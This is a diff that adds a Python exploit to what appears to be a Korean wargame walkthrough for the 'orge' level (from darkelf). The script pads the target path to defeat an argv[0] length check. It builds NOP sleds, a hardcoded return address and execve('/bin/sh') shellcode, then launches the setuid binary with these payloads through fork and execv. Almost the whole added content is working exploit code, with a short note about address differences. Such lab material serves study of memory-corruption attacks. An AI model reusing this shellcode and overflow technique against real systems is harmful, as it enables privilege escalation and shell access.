@@ -130,3 +130,34 @@ argv[0]의 길이를 체크하는 메커니즘이 들어 갔으며, 쉘기능을
 
 -----
 
+```python
+import os
+import struct
+
+append = lambda x, y: x + y
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/darkelf/" + "/"*59 + "orge"
+print len(target)
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+shellcode_addr = 0xbffffd20
+
+payload1 = "\x90"*44
+payload1 = append(payload1, p32(shellcode_addr))
+
+payload2 = "\x90"*50
+payload2 = append(payload2, shellcode)
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload1, payload2))
+else:
+        os.waitpid(pid, 0)
+```
+
+> python script로 할 때는 주소가 다를 수 있음
+
+-----
+
